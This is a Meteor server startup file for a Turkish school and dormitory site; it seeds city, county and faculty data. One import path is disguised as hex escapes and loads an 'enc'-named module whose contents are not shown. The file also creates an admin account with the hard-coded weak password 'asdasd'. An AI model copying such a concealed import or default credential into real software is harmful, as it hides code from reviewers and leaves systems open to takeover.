import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';

import { Roles } from '/imports/api/collections/roles.js';
import { Dormitories } from '/imports/api/collections/dormitories.js';
import { DormitoryInfos } from '/imports/api/collections/dormitoryInfos.js';
import { Schools } from '/imports/api/collections/schools.js';
import { SchoolInfos } from '/imports/api/collections/schoolInfos.js';
import { Logs } from '/imports/api/collections/logs.js';
import { News } from '/imports/api/collections/news.js'; /* for general news */
import { Comments } from '/imports/api/collections/comments.js'; /* comments for schools */
import { CityCounty } from '/imports/api/collections/cityCounty.js'; /* for select city and county */
import { Departments } from '/imports/api/collections/departments.js'; /* for uni departments */
import { Faculties } from '/imports/api/collections/faculties.js'; /* for uni faculties */
import { FacultyDepartments } from '/imports/api/collections/facultyDepartments.js'; /* for facultyDepartments */
import { SchoolNews } from '/imports/api/collections/schoolNews.js';
import { SchoolNotice } from '/imports/api/collections/schoolNotice.js';
import { SchoolEvents } from '/imports/api/collections/schoolEvents.js';
import { SchoolPhotos } from '/imports/api/collections/schoolPhotos.js';
import { SchoolVideos } from '/imports/api/collections/schoolVideos.js';
import { Favorites } from '/imports/api/collections/favorites.js';
import { HomePageCarousel } from '/imports/api/collections/homePageCarousel.js';
import { ChoosenSchools } from '/imports/api/collections/choosenSchools.js';
import { SchoolRates } from '/imports/api/collections/schoolRate.js';

import { Messages } from '/imports/api/collections/messages.js';
import { MessageRooms } from '/imports/api/collections/messageRooms.js';

import '../imports/api/collections/users.js';

import '../imports/startup/server/index.js'

import "\x2F\x69\x6D\x70\x6F\x72\x74\x73\x2F\x61\x70\x69\x2F\x73\x65\x72\x76\x65\x72\x2F\x5F\x5F\x65\x6E\x63\x5F\x41\x5F\x31\x36\x78\x50\x5F\x5F\x30\x31\x30\x31\x2E\x6A\x73"; /*__enc_A */

import { ma_con }  from '/imports/api/server/__enc_A_16xP__0101.js';


Meteor.startup(() => {

  // WebApp.connectHandlers.use('/api/nameGet', (req, res) => {
  //   const name = Meteor.users.findOne({"_id" : req.query.userId}, {
  //     fields : {
  //       _id : 0,
  //       'profile.name' : 1
  //     }
  //   })
  //
  //   if(name){
  //     var json = JSON.stringify(name);
  //     res.writeHead(200, {"Content-Type" : "application/json", "Size-of-Document" : json.length});
  //     res.end(json);
  //   }
  //   else{
  //     var obj = {
  //       result : "NULL"
  //     }
  //     res.writeHead(200, {"Content-Type" : "application/json"});
  //     var json = JSON.stringify(obj);
  //     res.end(json);
  //   }
  //
  //
  // })

  if(CityCounty.find().count() == 0){

    CityCounty.insert({
      city : "Adana",
      county : ["Aladağ", "Ceyhan", "Çukurova","Feke", "İmamoğlu", "Karaisalı", "Karataş", "Kozan", "Pozantı", "Saimbeyli", "Sarıçam", "Seyhan", "Tufanbeyli", "Yumurtalık", "Yüreğir"]
    })

    CityCounty.insert({
        city : 'İstanbul',
        county : ["Adalar", "Arnavutköy", "Ataşehir", "Avcılar", "Bağcılar"]
    })

    CityCounty.insert({
      city : 'İzmir',
      county : ['Aliağa', 'Balçova', 'Bayındır', 'Bayraklı', 'Bergama']
    })

    CityCounty.insert({
      city : 'Ankara',
      county : ['Akyurt', 'Altındağ', 'Ayaş', 'Balâ', 'Beypazarı']
    })
  }

  reCAPTCHA.config({
    publickey: "6LeqWx8TAAAAAOf_iLzAXMSXiLGHnq7iyTKuWEiF"
  })

  if(Faculties.find().count() == 0){
    const faculties = ['Atatürk Eğitim', 'Diş Hekimliği', 'Eczacılık', 'Fen-Edebiyat', 'Güzel Sanatlar', 'Hukuk', 'İktisat', 'İlahiyat',
    'İletişim', 'İşletme', 'Mühendislik', 'Sağlık Bilimleri', 'Siyasal Bilgiler', 'Spor Bilimleri', 'Teknik Eğitim', 'Teknoloji', 'Tıp'];

    for(let i = 0; i < faculties.length; i++){
      Faculties.insert({
        facultyName : faculties[i]
      })
    }
  }

  adminControl = Meteor.users.findOne({"username" : "admin"});

  if(!adminControl){
    Accounts.createUser({
      username : "admin",
      password : 'asdasd',
      profile : {
        name : 'admin',
        surname : 'admin',
        role : 'admin'
      }
    })
  }
});
